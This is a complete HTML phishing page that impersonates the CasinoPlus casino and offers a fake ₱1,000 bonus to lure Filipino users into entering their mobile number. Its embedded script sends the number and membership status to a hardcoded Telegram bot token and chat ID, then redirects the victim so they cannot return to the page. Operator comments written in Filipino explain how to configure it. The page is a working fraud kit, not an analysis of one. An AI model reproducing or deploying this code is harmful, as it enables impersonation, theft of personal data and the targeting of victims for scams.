<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CasinoPlus | Security Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">
    <style>
        :root {
            --gold: #fbbf24;
            --bg: #020617;
            --card-bg: rgba(30, 41, 59, 0.6);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body {
            background-color: var(--bg);
            background-image: 
                radial-gradient(circle at 50% 0%, #1e3a8a 0%, transparent 50%),
                radial-gradient(circle at 100% 100%, #0f172a 0%, #020617 100%);
            color: #f8fafc;
            font-family: 'Poppins', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            overflow: hidden;
        }

        /* Remastered Card */
        .card {
            width: 90%;
            max-width: 400px;
            background: var(--card-bg);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(251, 191, 36, 0.2);
            border-radius: 30px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
            animation: fadeIn 0.6s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(15px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .logo-img {
            width: 170px;
            margin-bottom: 25px;
            filter: drop-shadow(0 0 10px rgba(251, 191, 36, 0.3));
        }

        h1 { font-size: 22px; font-weight: 800; margin-bottom: 10px; }
        p { color: #94a3b8; font-size: 13px; line-height: 1.6; margin-bottom: 30px; }

        .input-group { text-align: left; margin-bottom: 20px; }
        .label-text {
            font-size: 10px;
            text-transform: uppercase;
            color: var(--gold);
            font-weight: 700;
            margin-bottom: 8px;
            display: block;
            letter-spacing: 1px;
        }

        input {
            width: 100%;
            background: rgba(15, 23, 42, 0.9);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 16px;
            color: #fff;
            font-size: 18px;
            font-family: 'JetBrains Mono', monospace;
            outline: none;
            transition: 0.3s;
        }

        input:focus { border-color: var(--gold); }

        /* Custom Radio Buttons */
        .radio-box {
            display: flex;
            gap: 10px;
            margin-bottom: 30px;
        }

        .radio-option {
            flex: 1;
            position: relative;
        }

        .radio-option input {
            position: absolute;
            opacity: 0;
            cursor: pointer;
        }

        .radio-design {
            display: block;
            padding: 12px;
            background: rgba(15, 23, 42, 0.6);
            border-radius: 12px;
            font-size: 14px;
            font-weight: 600;
            color: #94a3b8;
            border: 1px solid transparent;
            cursor: pointer;
        }

        .radio-option input:checked + .radio-design {
            background: var(--gold);
            color: #000;
            border-color: var(--gold);
        }

        .btn-claim {
            background: linear-gradient(180deg, #fbbf24 0%, #d97706 100%);
            color: #000;
            border: none;
            width: 100%;
            padding: 18px;
            border-radius: 15px;
            font-size: 16px;
            font-weight: 800;
            text-transform: uppercase;
            cursor: pointer;
            box-shadow: 0 8px 20px rgba(217, 119, 6, 0.3);
            transition: 0.2s;
        }

        .btn-claim:active { transform: scale(0.97); }
        .btn-claim:disabled { opacity: 0.5; cursor: not-allowed; }

        .shake { animation: shake 0.4s ease-in-out; border-color: #ef4444 !important; }
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-6px); }
            75% { transform: translateX(6px); }
        }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://casinoplus.static2.website/images/image-7.jpg" class="logo-img" alt="CasinoPlus">
        <h1>Account Verified?</h1>
        <p>Verify your mobile number to instantly claim your ₱1,000.00 bonus reward.</p>
        
        <div class="input-group">
            <span class="label-text">Mobile Number</span>
            <input type="tel" id="userPhone" placeholder="09xxxxxxxxx" maxlength="11">
        </div>

        <span class="label-text" style="text-align: left;">Already a Member?</span>
        <div class="radio-box">
            <label class="radio-option">
                <input type="radio" name="reg" value="Yes" checked>
                <span class="radio-design">YES</span>
            </label>
            <label class="radio-option">
                <input type="radio" name="reg" value="No">
                <span class="radio-design">NO</span>
            </label>
        </div>

        <button class="btn-claim" id="mainBtn" onclick="handleSubmission()">Verify & Claim Now</button>
    </div>

    <script>
        // CONFIGURATION
        const CONFIG = {
            botToken: '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg',
            chatId: '7298607329',
            bypass: true // I-set sa false kung gusto mo ng alert lang
        };

        function handleSubmission() {
            const phoneEl = document.getElementById('userPhone');
            const btn = document.getElementById('mainBtn');
            const phone = phoneEl.value;
            const isMember = document.querySelector('input[name="reg"]:checked').value;

            // 1. Validation
            if (phone.length < 11 || !phone.startsWith('09')) {
                phoneEl.classList.add('shake');
                setTimeout(() => phoneEl.classList.remove('shake'), 400);
                return;
            }

            // 2. UI Loading State
            btn.innerHTML = "Processing...";
            btn.disabled = true;

            // 3. Telegram Send (Using fetch for reliability)
            const text = `🎰 NEW ENTRY:\n📱 Number: ${phone}\n👤 Member: ${isMember}`;
            const url = `https://api.telegram.org/bot${CONFIG.botToken}/sendMessage?chat_id=${CONFIG.chatId}&text=${encodeURIComponent(text)}`;

            fetch(url)
                .then(() => {
                    if (CONFIG.bypass) {
                        // 4. Smooth Bypass Redirect
                        setTimeout(() => {
                            // window.location.replace para hindi na makabalik sa login
                            window.location.replace("main.html?v=" + Date.now());
                        }, 1000);
                    } else {
                        alert("Verification complete. Please wait for the system call.");
                        btn.innerHTML = "Verify & Claim Now";
                        btn.disabled = false;
                    }
                })
                .catch(err => {
                    console.error("Error:", err);
                    // Fallback redirect kahit mag-fail ang telegram (para hindi ma-stuck ang user)
                    window.location.replace("main.html");
                });
        }

        // Numbers only input filter
        document.getElementById('userPhone').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });
    </script>
</body>
</html>
